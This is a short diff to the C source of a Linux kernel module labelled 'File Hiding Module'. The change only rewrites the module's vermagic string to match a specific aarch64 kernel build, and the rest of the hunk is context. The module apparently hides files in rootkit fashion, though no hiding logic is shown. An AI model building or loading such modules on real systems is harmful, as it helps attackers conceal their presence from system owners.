@@ -14,7 +14,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("HOOK");
 MODULE_DESCRIPTION("File Hiding Module");
 MODULE_VERSION("1.0");
-MODULE_INFO(vermagic, "5.10.0 SMP preempt mod_unload aarch64");
+MODULE_INFO(vermagic, "5.10.252-dirty SMP preempt mod_unload modversions aarch64");
 
 /* Hidden file/folder storage */
 static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
